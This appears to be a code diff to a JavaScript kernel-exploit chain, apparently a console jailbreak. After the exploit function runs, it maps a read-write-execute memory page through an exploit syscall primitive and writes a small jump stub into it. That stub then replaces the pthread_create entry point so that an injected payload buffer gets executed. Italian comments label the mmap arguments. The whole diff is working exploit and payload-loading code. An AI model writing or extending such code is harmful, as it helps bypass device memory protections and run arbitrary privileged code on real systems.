@@ -1808,6 +1808,26 @@ export async function kexploit() {
 kexploit().then(() => {
 
 
+var loader_addr = chain.sysp(
+  'mmap',
+  new Int(0, 0),                         // lascia al kernel l’indirizzo libero
+  0x1000,                                // dimensione = 4 KB
+  PROT_READ | PROT_WRITE | PROT_EXEC,    // permessi R+W+X
+  0x41000,                               // MAP_ANONYMOUS | MAP_PRIVATE
+  -1,
+  0
+);
+
+
+var stub_dword = 0x00C3E7FF;
+
+
+var tmpStubArray = array_from_address(loader_addr, 1);
+tmpStubArray[0] = stub_dword;
+
+
+var payload_loader = loader_addr;
+
        
 function array_from_address(addr, size) {
 
@@ -1846,7 +1866,7 @@ var req = new XMLHttpRequest();
         'pthread_create',
         pthread,
         0,
-        pl,
+        payload_loader,
         payload_buffer,
     );	
 }
